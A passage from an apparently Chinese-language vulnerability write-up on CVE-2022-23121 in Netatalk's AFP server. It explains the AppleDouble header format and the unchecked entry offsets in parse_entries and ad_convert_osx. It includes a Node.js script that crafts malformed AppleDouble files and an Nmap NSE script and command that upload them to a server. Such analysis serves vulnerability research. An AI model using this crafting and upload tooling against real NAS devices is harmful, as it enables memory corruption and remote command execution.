href=#漏洞成因>漏洞成因</a></li><li><a href=#分析函数调用链><strong>分析函数调用链</strong></a></li><li><a href=#触发漏洞流程><strong>触发漏洞流程</strong></a></li></ul></li><li><a href=#环境搭建>环境搭建</a></li><li><a href=#调试>调试</a><ul><li><a href=#为什么要设置条件断点><strong>为什么要设置条件断点</strong></a></li><li><a href=#正常调试><strong>正常调试</strong></a></li><li><a href=#如何利用entry内的越界>如何利用entry内的越界</a></li><li><a href=#补丁分析>补丁分析</a></li><li><a href=#函数解释>函数解释</a></li><li><a href=#参考链接>参考链接</a></li></ul></li></ul></nav><h3 id=netatalk介绍>Netatalk介绍</h3><p><a href=http://netatalk.sourceforge.net/ target=_blank>Netatalk</a> 是一个 <code>Apple Filing Protocol (AFP)</code> 的开源实现。它为 Unix 风格系统提供了与 Macintosh 文件共享的功能。多款NAS产品均有集成该功能。</p><h3 id=漏洞简介>漏洞简介</h3><p>Netatalk在处理<code>FPOpenFork</code>命令的时候，由于未检查AppleDouble文件头中的偏移是否超出范围，导致攻击者可以通过控制AppleDouble文件的某些偏移，在内存中进行越界读写，通过该漏洞攻击者可以以启动Netatalk的用户权限执行任意命令</p><h3 id=appledouble文件>Appledouble文件</h3><p>Appledouble文件格式文档可在下面链接下载，AppleDouble文件是mac上一种存储数据的格式，AppleDouble文件可分为文件头和数据部分，文件头格式如下，对于每个Entry来说，数据在文件内的范围可表示为：<code>[offset:offset+length]</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>Field                              Length
</span></span><span style=display:flex><span>Magic number                       4 bytes
</span></span><span style=display:flex><span>Version number                     4 bytes
</span></span><span style=display:flex><span>Filler                             16 bytes
</span></span><span style=display:flex><span>Number of entries                  2 bytes
</span></span><span style=display:flex><span>Entry descriptor for each entry:
</span></span><span style=display:flex><span>	Entry ID                         4 bytes
</span></span><span style=display:flex><span>		Offset                         4 bytes
</span></span><span style=display:flex><span>		Length                         4 bytes
</span></span></code></pre></div><p>以下是一个有效的Appledouble文件，包含两个entry</p><p>entry 1</p><ul><li>entry ID：0x09</li><li>offset：0x32</li><li>length：0x71</li></ul><p>entry 2</p><ul><li>entry ID：0x02</li><li>offset：0xA3</li><li>length：0x46</li></ul><p><img alt src=/images/vulnerability/CVE-2022-23121-AFP-RCE.zh-cn.assets/1.png></p><blockquote><p><a href=https://web.archive.org/web/20180311140826if_/http://kaiser-edv.de/documents/AppleSingle_AppleDouble.pdf target=_blank>https://web.archive.org/web/20180311140826if_/http://kaiser-edv.de/documents/AppleSingle_AppleDouble.pdf</a></p></blockquote><h3 id=如何生成有效的appledouble文件触发漏洞>如何生成有效的<strong>AppleDouble文件触发漏洞</strong></h3><p>在
<a href=https://nosec.org/home/detail/4997.html target=_blank>https://nosec.org/home/detail/4997.html</a> 中keeee师傅分享了如何通过xattr库生成appledouble文件，这里为了方便生成所需文件对keeee师傅的方法进行魔改。</p><p>首先安装 xattr-file和minimist库：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>npm install xattr-file
</span></span><span style=display:flex><span>npm install minimist
</span></span></code></pre></div><p>在node_modules目录内找到xattr-file.js文件，修改creat方法，为其添加接受各种偏移的接口，大致如下：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-jsx data-lang=jsx><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>create</span>(<span style=color:#a6e22e>attrs</span>, <span style=color:#a6e22e>resoLength</span>, <span style=color:#a6e22e>findoff</span>, <span style=color:#a6e22e>findlen</span>, <span style=color:#a6e22e>forkoff</span>, <span style=color:#a6e22e>forklen</span>) {
</span></span><span style=display:flex><span>  ......
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>var</span> <span style=color:#a6e22e>finderInfoOffset</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>findoff</span> <span style=color:#f92672>==</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span> <span style=color:#f92672>?</span> <span style=color:#a6e22e>applLength</span> <span style=color:#f92672>:</span> <span style=color:#a6e22e>findoff</span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>var</span> <span style=color:#a6e22e>finderInfoLength</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>findlen</span> <span style=color:#f92672>==</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span> <span style=color:#f92672>?</span> (<span style=color:#a6e22e>attrLength</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>keysLength</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>dataLength</span>) <span style=color:#f92672>:</span> <span style=color:#a6e22e>findlen</span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>var</span> <span style=color:#a6e22e>resourceForkOffset</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>forkoff</span> <span style=color:#f92672>==</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span> <span style=color:#f92672>?</span> <span style=color:#a6e22e>fileLength</span> <span style=color:#f92672>:</span> <span style=color:#a6e22e>forkoff</span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>var</span> <span style=color:#a6e22e>resourceForkLength</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>forklen</span> <span style=color:#f92672>==</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span> <span style=color:#f92672>?</span> <span style=color:#a6e22e>resoLength</span> <span style=color:#f92672>:</span> <span style=color:#a6e22e>forklen</span>
</span></span></code></pre></div><p>生成xattr文件的nodejs脚本：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-jsx data-lang=jsx><span style=display:flex><span><span style=color:#66d9ef>var</span> <span style=color:#a6e22e>xattr</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>require</span>(<span style=color:#e6db74>&#34;xattr-file&#34;</span>);
</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>args</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>require</span>(<span style=color:#e6db74>&#39;minimist&#39;</span>)(<span style=color:#a6e22e>process</span>.<span style=color:#a6e22e>argv</span>.<span style=color:#a6e22e>slice</span>(<span style=color:#ae81ff>2</span>))
</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>fs</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>require</span>(<span style=color:#e6db74>&#39;fs&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>var</span> <span style=color:#a6e22e>fp</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;./&#39;</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>var</span> <span style=color:#a6e22e>origname</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;read&#39;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>// resource fork data 部分：
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>var</span> <span style=color:#a6e22e>buffer2</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>Buffer</span>.<span style=color:#a6e22e>from</span>(<span style=color:#e6db74>&#34;a&#34;</span>.<span style=color:#a6e22e>repeat</span>(<span style=color:#ae81ff>0x12</span>))
</span></span><span style=display:flex><span><span style=color:#66d9ef>var</span> <span style=color:#a6e22e>buffer3</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>Buffer</span>.<span style=color:#a6e22e>from</span>(<span style=color:#e6db74>&#34;a&#34;</span>.<span style=color:#a6e22e>repeat</span>(<span style=color:#ae81ff>0x34</span>))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#a6e22e>Buffer</span>.<span style=color:#a6e22e>concat</span>([ <span style=color:#a6e22e>buffer2</span>, <span style=color:#a6e22e>buffer3</span>]).<span style=color:#a6e22e>length</span>)  <span style=color:#75715e>// 打印的 resource fork data 长度。
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>resoLength</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>Buffer</span>.<span style=color:#a6e22e>concat</span>([<span style=color:#a6e22e>buffer2</span>, <span style=color:#a6e22e>buffer3</span>]).<span style=color:#a6e22e>length</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>var</span> <span style=color:#a6e22e>findoff</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>args</span>[<span style=color:#e6db74>&#39;findoff&#39;</span>] <span style=color:#f92672>==</span> <span style=color:#66d9ef>undefined</span> <span style=color:#f92672>?</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span> <span style=color:#f92672>:</span> parseInt(<span style=color:#a6e22e>args</span>[<span style=color:#e6db74>&#39;findoff&#39;</span>])
</span></span><span style=display:flex><span><span style=color:#66d9ef>var</span> <span style=color:#a6e22e>findlen</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>args</span>[<span style=color:#e6db74>&#39;findlen&#39;</span>] <span style=color:#f92672>==</span> <span style=color:#66d9ef>undefined</span> <span style=color:#f92672>?</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span> <span style=color:#f92672>:</span> parseInt(<span style=color:#a6e22e>args</span>[<span style=color:#e6db74>&#39;findlen&#39;</span>])
</span></span><span style=display:flex><span><span style=color:#66d9ef>var</span> <span style=color:#a6e22e>forklen</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>args</span>[<span style=color:#e6db74>&#39;forklen&#39;</span>] <span style=color:#f92672>==</span> <span style=color:#66d9ef>undefined</span> <span style=color:#f92672>?</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span> <span style=color:#f92672>:</span> parseInt(<span style=color:#a6e22e>args</span>[<span style=color:#e6db74>&#39;forklen&#39;</span>])
</span></span><span style=display:flex><span><span style=color:#66d9ef>var</span> <span style=color:#a6e22e>forkoff</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>args</span>[<span style=color:#e6db74>&#39;forkoff&#39;</span>] <span style=color:#f92672>==</span> <span style=color:#66d9ef>undefined</span> <span style=color:#f92672>?</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span> <span style=color:#f92672>:</span> parseInt(<span style=color:#a6e22e>args</span>[<span style=color:#e6db74>&#39;forkoff&#39;</span>])
</span></span><span style=display:flex><span><span style=color:#75715e>// 如果name为空则为read
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>var</span> <span style=color:#a6e22e>name</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>args</span>[<span style=color:#e6db74>&#34;name&#34;</span>] <span style=color:#f92672>==</span> <span style=color:#66d9ef>undefined</span> <span style=color:#f92672>?</span> <span style=color:#a6e22e>origname</span> <span style=color:#f92672>:</span> <span style=color:#a6e22e>args</span>[<span style=color:#e6db74>&#34;name&#34;</span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#e6db74>&#39;findoff:&#39;</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>findoff</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34; findlen:&#34;</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>findlen</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34; forkoff:&#34;</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>forkoff</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34; forklen:&#34;</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>forklen</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>var</span> <span style=color:#a6e22e>buffer</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>xattr</span>.<span style=color:#a6e22e>create</span>({
</span></span><span style=display:flex><span>  <span style=color:#e6db74>&#34;com.example.Attribute&#34;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;my data&#34;</span>
</span></span><span style=display:flex><span>}, <span style=color:#a6e22e>resoLength</span>, <span style=color:#a6e22e>findoff</span>, <span style=color:#a6e22e>findlen</span>, <span style=color:#a6e22e>forkoff</span>, <span style=color:#a6e22e>forklen</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>var</span> <span style=color:#a6e22e>buffer4</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>Buffer</span>.<span style=color:#a6e22e>concat</span>([<span style=color:#a6e22e>buffer</span>, <span style=color:#a6e22e>buffer2</span>, <span style=color:#a6e22e>buffer3</span>])
</span></span><span style=display:flex><span><span style=color:#a6e22e>fs</span>.<span style=color:#a6e22e>writeFile</span>(<span style=color:#a6e22e>fp</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#39;._&#39;</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>name</span>, <span style=color:#a6e22e>buffer4</span>, { <span style=color:#a6e22e>mode</span><span style=color:#f92672>:</span> <span style=color:#ae81ff>0o777</span> }, <span style=color:#a6e22e>err</span> =&gt; {
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>err</span>) {
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>error</span>(<span style=color:#a6e22e>err</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span>
</span></span><span style=display:flex><span>  } <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#e6db74>&#34;success write file, file path: &#34;</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>fp</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#39;._&#39;</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>name</span>)
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#75715e>//文件写入成功。
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>}
</span></span><span style=display:flex><span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>fs</span>.<span style=color:#a6e22e>writeFile</span>(<span style=color:#a6e22e>fp</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>name</span>, <span style=color:#e6db74>&#34;hello world&#34;</span>, { <span style=color:#a6e22e>mode</span><span style=color:#f92672>:</span> <span style=color:#ae81ff>0o777</span> }, <span style=color:#a6e22e>err</span> =&gt; {
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>err</span>) {
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>error</span>(<span style=color:#a6e22e>err</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span>
</span></span><span style=display:flex><span>  } <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#e6db74>&#34;success write file, file path: &#34;</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>fp</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>name</span>)
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#75715e>//文件写入成功。
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>}
</span></span><span style=display:flex><span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>fs</span>.<span style=color:#a6e22e>chmod</span>(<span style=color:#a6e22e>fp</span><span style=color:#f92672>+</span> <span style=color:#a6e22e>name</span>, <span style=color:#ae81ff>0o777</span>, () =&gt; {
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#e6db74>&#34;change &#34;</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>fp</span><span style=color:#f92672>+</span> <span style=color:#a6e22e>name</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34; mode&#34;</span>)
</span></span><span style=display:flex><span>})
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>fs</span>.<span style=color:#a6e22e>chmod</span>(<span style=color:#a6e22e>fp</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#39;._&#39;</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>name</span>, <span style=color:#ae81ff>0o777</span>, () =&gt; {
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#e6db74>&#34;change &#34;</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>fp</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#39;._&#39;</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>name</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34; mode&#34;</span>)
</span></span><span style=display:flex><span>})
</span></span></code></pre></div><p><strong>如何将文件上传到服务器</strong></p><p>生成文件后，为了更贴合实际漏洞利用场景，即生成有效AppleDouble文件后通过AFP客户端上传到AFP服务器，这里借鉴Nmap自带的afp的lua库，编写我们自己的上传NSE脚本。</p><p>在Nmap中原生包含了afp-ls的NSE脚本，其引用的lua库afp.lua内含有我们通过AFP协议上传文件需要的接口WriteFile，在上传文件的NSE脚本中调用该接口即可</p><p><img alt src=/images/vulnerability/CVE-2022-23121-AFP-RCE.zh-cn.assets/2.png></p><p>在scripts目录下新建afp-upfile.nse文件，将afp-ls.nse内容粘贴进去，去掉列出文件逻辑的代码，之后编写lua代码，读取文件，将文件内容传给afp.lua内的WriteFile函数即可，最终如下：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-lua data-lang=lua><span style=display:flex><span>......
</span></span><span style=display:flex><span>action <span style=color:#f92672>=</span> <span style=color:#66d9ef>function</span>(host, port)
</span></span><span style=display:flex><span>  <span style=color:#75715e>-- 这里和afp-ls的逻辑一样</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>local</span> msg
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>local</span> uploadpath <span style=color:#f92672>=</span> args[<span style=color:#e6db74>&#34;uploadpath&#34;</span>]
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>local</span> filepath <span style=color:#f92672>=</span> args[<span style=color:#e6db74>&#34;filepath&#34;</span>]
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>local</span> poc <span style=color:#f92672>=</span> io.open(filepath,<span style=color:#e6db74>&#34;r&#34;</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>local</span> data <span style=color:#f92672>=</span> poc:read(<span style=color:#e6db74>&#34;*all&#34;</span>)
</span></span><span style=display:flex><span>    poc:close()
</span></span><span style=display:flex><span>    status, msg <span style=color:#f92672>=</span> afpHelper:WriteFile(uploadpath, data)
</span></span><span style=display:flex><span>    status, response <span style=color:#f92672>=</span> afpHelper:Logout()
</span></span><span style=display:flex><span>    status, response <span style=color:#f92672>=</span> afpHelper:CloseSession()
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> data
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>end</span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>end</span>
</span></span></code></pre></div><p>利用该脚本，可以通过nmap上传文件到afp服务器</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>nmap -p <span style=color:#ae81ff>548</span> --script<span style=color:#f92672>=</span>afp-upfile --script-args <span style=color:#e6db74>&#34;uploadpath=test/._cmd,filepath=./._cmd&#34;</span> ip
</span></span></code></pre></div><h3 id=漏洞成因>漏洞成因</h3><p><code>libatalk/adouble/ad_open.c#parse_entries</code> 函数为Nettatalk解析buf内的数据到自定义的结构体，通过读取buf内对应offset的数据到传入的ad指针指向的<code>adouble</code>结构体的某些成员内，完成对相应值的设置，<strong>其中buf数据来自读取的._filename的文件</strong>。在循环中将buf首地址加上某个offset中的数据通过<code>memcpy</code>函数拷贝到ad指向的adouble结构体变量内，在循环内含有一个if判断，当处于以下情况时，<code>parse_entries</code> 会返回-1并且打印警告日志</p><ol><li><code>eid > ADEID_MAX，ADEID_MAX=20</code></li><li><code>off>sizeof(ad->ad_data)</code></li><li>eid不等于2并且此时的entry的偏移和数据长度相加大于1024</li></ol><p>即通过控制文件内的数据，我们可以控制adouble结构体内的entry的off+len使得entry.off+entry.len+buf超过buf的边界，正常流程中adouble结构体内的entry的off+len+buf不应该越过buf边界。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#66d9ef>static</span> <span style=color:#66d9ef>int</span> <span style=color:#a6e22e>parse_entries</span>(<span style=color:#66d9ef>struct</span> <span style=color:#a6e22e>adouble</span> <span style=color:#f92672>*</span>ad, <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>buf, <span style=color:#66d9ef>uint16_t</span> nentries)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>uint32_t</span>   eid, len, off;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>int</span>        ret <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>    <span style=color:#75715e>/* now, read in the entry bits */</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> (; nentries <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>0</span>; nentries<span style=color:#f92672>--</span> ) {
</span></span><span style=display:flex><span>        memcpy(<span style=color:#f92672>&amp;</span>eid, buf, <span style=color:#66d9ef>sizeof</span>( eid ));
</span></span><span style=display:flex><span>        eid <span style=color:#f92672>=</span> get_eid(ntohl(eid));
</span></span><span style=display:flex><span>        buf <span style=color:#f92672>+=</span> <span style=color:#66d9ef>sizeof</span>( eid );
</span></span><span style=display:flex><span>        memcpy(<span style=color:#f92672>&amp;</span>off, buf, <span style=color:#66d9ef>sizeof</span>( off ));
</span></span><span style=display:flex><span>        off <span style=color:#f92672>=</span> ntohl( off );
</span></span><span style=display:flex><span>        buf <span style=color:#f92672>+=</span> <span style=color:#66d9ef>sizeof</span>( off );
</span></span><span style=display:flex><span>        memcpy(<span style=color:#f92672>&amp;</span>len, buf, <span style=color:#66d9ef>sizeof</span>( len ));
</span></span><span style=display:flex><span>        len <span style=color:#f92672>=</span> ntohl( len );
</span></span><span style=display:flex><span>        buf <span style=color:#f92672>+=</span> <span style=color:#66d9ef>sizeof</span>( len );
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        ad<span style=color:#f92672>-&gt;</span>ad_eid[eid].ade_off <span style=color:#f92672>=</span> off;
</span></span><span style=display:flex><span>        ad<span style=color:#f92672>-&gt;</span>ad_eid[eid].ade_len <span style=color:#f92672>=</span> len;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>eid
</span></span><span style=display:flex><span>            <span style=color:#f92672>||</span> eid <span style=color:#f92672>&gt;</span> ADEID_MAX
</span></span><span style=display:flex><span>            <span style=color:#f92672>||</span> off <span style=color:#f92672>&gt;=</span> <span style=color:#66d9ef>sizeof</span>(ad<span style=color:#f92672>-&gt;</span>ad_data)
</span></span><span style=display:flex><span>            <span style=color:#f92672>||</span> ((eid <span style=color:#f92672>!=</span> ADEID_RFORK) <span style=color:#f92672>&amp;&amp;</span> (off <span style=color:#f92672>+</span> len <span style=color:#f92672>&gt;</span>  <span style=color:#66d9ef>sizeof</span>(ad<span style=color:#f92672>-&gt;</span>ad_data)))) <span style=color:#75715e>// ADEID_RFORK
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        {
</span></span><span style=display:flex><span>            ret <span style=color:#f92672>=</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span>            LOG(log_warning, logtype_ad, <span style=color:#e6db74>&#34;parse_entries: bogus eid: %u, off: %u, len: %u&#34;</span>,
</span></span><span style=display:flex><span>                (uint)eid, (uint)off, (uint)len);
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> ret;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// adouble 定义
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>struct</span> <span style=color:#a6e22e>adouble</span> {
</span></span><span style=display:flex><span>	......
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>char</span>                ad_data[AD_DATASZ_MAX]; <span style=color:#75715e>//AD_DATASZ_MAX = 1024
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>};
</span></span></code></pre></div><p>在代码里，在以下几处函数中有调用<code>parse_entries</code> 函数</p><ul><li><code>ad_header_read</code></li><li><code>ad_header_read_osx</code></li><li><code>ad_header_read_ea</code></li></ul><p>在三处函数中，只有<code>libatalk/adouble/ad_open.c#ad_header_read_osx</code>函数调用<code>parse_entries</code>函数时，即使<code>parse_entries</code>返回-1，该函数不会<code>return</code>也不会进入异常处理流程，仅仅是通过日志记录，继续执行而不报错。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#66d9ef>if</span> (parse_entries(<span style=color:#f92672>&amp;</span>adosx, buf, nentries) <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>) {
</span></span><span style=display:flex><span>        LOG(log_warning, logtype_ad, <span style=color:#e6db74>&#34;ad_header_read(%s): malformed AppleDouble&#34;</span>,
</span></span><span style=display:flex><span>            path <span style=color:#f92672>?</span> fullpathname(path) <span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;&#34;</span>);
</span></span><span style=display:flex><span>    }
</span></span></code></pre></div><p>之后<code>ad_header_read_osx</code> 会读取adouble结构体内的偏移，判断finderinfo的entry len是否等于32，不等于则进入if内，并调用<code>libatalk/adouble/ad_open.c#ad_convert_osx</code> 函数</p><p><img alt src=/images/vulnerability/CVE-2022-23121-AFP-RCE.zh-cn.assets/3.png></p><p>在<code>ad_convert_osx</code> 函数中会读取ad指针指向的adouble结构体内的entry结构的off和len偏移并调用<code>memmove</code>函数进行内存复制，此偏移恰好是<code>parse_entries</code> 函数从文件读取并赋值的偏移。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#66d9ef>static</span> <span style=color:#66d9ef>int</span> <span style=color:#a6e22e>ad_convert_osx</span>(<span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>path, <span style=color:#66d9ef>struct</span> <span style=color:#a6e22e>adouble</span> <span style=color:#f92672>*</span>ad)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>......
</span></span><span style=display:flex><span>    origlen <span style=color:#f92672>=</span> ad_getentryoff(ad, ADEID_RFORK) <span style=color:#f92672>+</span> ad_getentrylen(ad, ADEID_RFORK);
</span></span><span style=display:flex><span>    map <span style=color:#f92672>=</span> mmap(NULL, origlen, PROT_READ <span style=color:#f92672>|</span> PROT_WRITE, MAP_SHARED, ad_reso_fileno(ad), <span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (map <span style=color:#f92672>==</span> MAP_FAILED) {
</span></span><span style=display:flex><span>        LOG(log_error, logtype_ad, <span style=color:#e6db74>&#34;mmap AppleDouble: %s</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, strerror(errno));
</span></span><span style=display:flex><span>        EC_FAIL;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    memmove(map <span style=color:#f92672>+</span> ad_getentryoff(ad, ADEID_FINDERI) <span style=color:#f92672>+</span> ADEDLEN_FINDERI,
</span></span><span style=display:flex><span>            map <span style=color:#f92672>+</span> ad_getentryoff(ad, ADEID_RFORK),
</span></span><span style=display:flex><span>            ad_getentrylen(ad, ADEID_RFORK));
</span></span><span style=display:flex><span>    (<span style=color:#66d9ef>void</span>)ad_rebuild_adouble_header_osx(ad, map);
</span></span><span style=display:flex><span>    munmap(map, origlen);
</span></span></code></pre></div><h3 id=分析函数调用链><strong>分析函数调用链</strong></h3><p>通过
